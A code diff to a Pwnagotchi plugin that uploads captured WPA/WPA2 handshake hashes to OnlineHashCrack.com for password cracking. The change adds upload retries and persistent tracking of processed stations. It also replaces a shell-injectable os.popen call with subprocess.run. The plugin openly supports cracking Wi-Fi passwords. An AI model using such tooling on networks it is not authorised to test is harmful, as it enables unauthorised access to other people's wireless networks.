@@ -2,6 +2,7 @@ import os
 import logging
 import requests
 import time
+import subprocess
 from threading import Lock
 from pwnagotchi.utils import StatusFile
 import pwnagotchi.plugins as plugins
@@ -10,14 +11,13 @@ from json.decoder import JSONDecodeError
 
 class ohcapi(plugins.Plugin):
     __author__ = 'charveey'
-    __version__ = '1.0.0'
+    __version__ = '1.0.1'
     __license__ = 'GPL3'
     __description__ = 'Uploads WPA/WPA2 handshakes to OnlineHashCrack.com using the new API (V2), no dashboard.'
 
     def __init__(self):
         self.ready = False
         self.lock = Lock()
-        self.skip = list()
         self.last_run = 0
 
         try:
@@ -94,8 +94,12 @@ class ohcapi(plugins.Plugin):
 
     def _run_tasks(self, agent):
         with self.lock:
-            display = agent.view()
-            config  = agent.config()
+            try:
+                display = agent.view()
+                config  = agent.config()
+            except Exception as e:
+                logging.error(f"[OHC] Failed to get agent state: {e}")
+                return
             reported           = self.report.data_field_or('reported', default=[])
             processed_stations = self.report.data_field_or('processed_stations', default=[])
             handshake_dir      = config['bettercap']['handshakes']
@@ -106,9 +110,8 @@ class ohcapi(plugins.Plugin):
                 for f in os.listdir(handshake_dir)
                 if f.endswith('.pcap')
             ]
-            all_pcaps = [p for p in all_pcaps if not os.path.exists(p.replace('.pcap', '.22000'))]
 
-            handshake_new = set(all_pcaps) - set(reported) - set(self.skip)
+            handshake_new = set(all_pcaps) - set(reported)
 
             if not handshake_new:
                 logging.debug("[OHC] No new PCAP files to process.")
@@ -124,13 +127,14 @@ class ohcapi(plugins.Plugin):
                 hashes = self._extract_hashes_from_handshake(pcap_path)
                 if not hashes:
                     logging.debug(f"[OHC] No hashes extracted from {pcap_path}, skipping.")
-                    self.skip.append(pcap_path)
+                    reported.append(pcap_path)
                     continue
 
                 essid, bssid = self._extract_essid_bssid_from_hash(hashes[0])
-                if (essid, bssid) in processed_stations:
-                    logging.debug(f"[OHC] Station {essid}/{bssid} already processed, skipping.")
-                    self.skip.append(pcap_path)
+                station_key = f"{essid}|{bssid}"
+                if station_key in processed_stations:
+                    logging.debug(f"[OHC] Station {station_key} already processed, skipping.")
+                    reported.append(pcap_path)
                     continue
 
                 all_hashes.extend(hashes)
@@ -139,6 +143,12 @@ class ohcapi(plugins.Plugin):
 
             if not all_hashes:
                 logging.debug("[OHC] No hashes extracted from new PCAPs.")
+                self.report.update(
+                    data={
+                        'reported': reported,
+                        'processed_stations': processed_stations
+                    }
+                )
                 display.on_normal()
                 return
 
@@ -155,13 +165,14 @@ class ohcapi(plugins.Plugin):
                 for pcap_path in successfully_extracted:
                     reported.append(pcap_path)
                     essid, bssid = essid_bssid_map[pcap_path]
-                    processed_stations.append((essid, bssid))
+                    station_key = f"{essid}|{bssid}"
+                    processed_stations.append(station_key)
                 self.report.update(data={'reported': reported, 'processed_stations': processed_stations})
                 logging.info("[OHC] Successfully uploaded all new handshakes.")
             else:
-                for pcap_path in successfully_extracted:
-                    self.skip.append(pcap_path)
-                logging.warning("[OHC] Upload failed, added to skip list for this session.")
+                logging.warning(
+                    "[OHC] Upload failed. Handshakes will be retried later."
+                )
 
             display.on_normal()
 
@@ -179,23 +190,58 @@ class ohcapi(plugins.Plugin):
             'receive_email': self.options['receive_email'],
         }
 
-        try:
-            result = requests.post(
-                'https://api.onlinehashcrack.com/v2',
-                json=payload,
-                timeout=timeout
-            )
-            result.raise_for_status()
-            logging.info(f"[OHC] Upload response: {result.json()}")
-            return True
-        except requests.exceptions.RequestException as e:
-            logging.error(f"[OHC] Upload failed: {e}")
-            return False
+        for attempt in range(3):
+            try:
+                result = requests.post(
+                    'https://api.onlinehashcrack.com/v2',
+                    json=payload,
+                    timeout=timeout
+                )
+        
+                result.raise_for_status()
+                data = result.json()
+
+                logging.info(f"[OHC] Upload response: {data}")
+                
+                if data.get("success") is False:
+                    logging.error(
+                        f"[OHC] API rejected upload: {data}"
+                    )
+                    return False
+                return True
+            except (ValueError, JSONDecodeError) as e:
+                logging.error(f"[OHC] Invalid JSON response: {e}")
+                return False
+            except requests.exceptions.RequestException as e:
+                logging.warning(
+                    f"[OHC] Upload attempt "
+                    f"{attempt + 1}/3 failed: {e}"
+                )
+        
+                if attempt < 2:
+                    time.sleep(5 * (attempt + 1))
+        
+        logging.error("[OHC] Upload failed after 3 attempts.")
+        return False
 
     def _extract_hashes_from_handshake(self, pcap_path):
         hccapx_path = pcap_path.replace('.pcap', '.22000')
-        os.popen(f'/usr/bin/hcxpcapngtool -o {hccapx_path} {pcap_path}').read()
-
+        try:                                               
+            subprocess.run(
+                ['/usr/bin/hcxpcapngtool', '-o', hccapx_path, pcap_path],
+                capture_output=True,
+                timeout=60
+            )
+        except FileNotFoundError:
+            logging.error("[OHC] hcxpcapngtool not found. Is it installed?")
+            return []
+        except subprocess.TimeoutExpired:
+            logging.warning(f"[OHC] hcxpcapngtool timed out on {pcap_path}")
+            return []
+        except Exception as e:
+            logging.error(f"[OHC] Unexpected error running hcxpcapngtool: {e}")
+            return []
+    
         if os.path.exists(hccapx_path) and os.path.getsize(hccapx_path) > 0:
             logging.debug(f"[OHC] Extracted hashes from {pcap_path}")
             with open(hccapx_path, 'r') as f:
